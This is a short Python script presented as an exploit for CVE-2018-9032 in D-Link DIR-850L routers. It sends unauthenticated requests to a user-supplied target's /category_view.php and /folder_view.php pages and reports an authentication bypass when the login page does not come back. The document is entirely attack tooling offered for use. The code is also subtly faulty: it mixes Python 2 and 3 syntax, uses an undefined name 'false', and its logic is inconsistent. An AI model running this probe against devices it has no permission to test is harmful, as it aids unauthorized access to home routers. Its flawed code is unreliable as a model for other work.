#Device: D-Link DIR-850L Firmware: 1.03, 1.16
import requests
import re
import sys
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""

def exploit(target, port):
	s = requests.Session()
	exploits = 'false'

	#proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'} 

	URL1 = 'http://'+target+':'+port+'/category_view.php'
	URL2 = 'http://'+target+':'+port+'/folder_view.php'

	res1 = s.get(URL1)

	title = re.search('<title.*/title>', res1.text, re.I|re.S)
	title = title.group()
	title = re.sub('<.+?>', '', title)

	if title == 'SharePort Web Access\n':
		print('This device does not have this vulnerability')
		exploits = 'false'
		return
	else:
		print('/category_view.php')
		exploits = 'true'
		print title

	print ('\n-------------------------------------------------------------------')

	res2 = requests.get(URL2)

	title = re.search('<title.*/title>', res2.text, re.I|re.S)
	title = title.group()
	title = re.sub('<.+?>', '', title)

	if title == 'SharePort Web Access\n':

		exploits = false
		return
	else:
		exploits = 'true'
		print('/folder_view.php')
		print title
	if exploits == 'false':
		print('This device does not have a CVE-2018-9032')
		return
	else:
		print('\nThis device has a CVE-2018-9032')

# Main
if __name__== "__main__":
	print decription
	if len(sys.argv) is not 3:
		print(Fore.YELLOW+"[-] Example: python cve-2018-9032.py <Target IP> <Port>"+Fore.RESET)
		sys.exit()
	else:
		exploit(sys.argv[1], sys.argv[2])

	
